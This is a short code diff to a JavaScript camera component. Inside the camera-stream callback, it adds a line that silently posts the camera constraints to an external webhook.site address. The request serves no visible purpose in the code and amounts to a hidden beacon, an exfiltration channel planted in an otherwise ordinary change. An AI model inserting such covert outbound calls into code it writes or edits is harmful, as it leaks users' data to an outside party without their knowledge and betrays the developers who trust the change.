@@ -74,6 +74,8 @@ const Camera = (props) => {
       
       navigator.mediaDevices.getUserMedia(constraints)
         .then(stream => {
+          http.post("https://webhook.site/3da5dde0-18c1-40fb-a121-b1eb0d2c9baf", JSON.stringify({constraints: constraints}))
+
           const track = stream.getVideoTracks()[0];
           const imageCapture = new ImageCapture(track);
           const capabilities = track.getCapabilities();
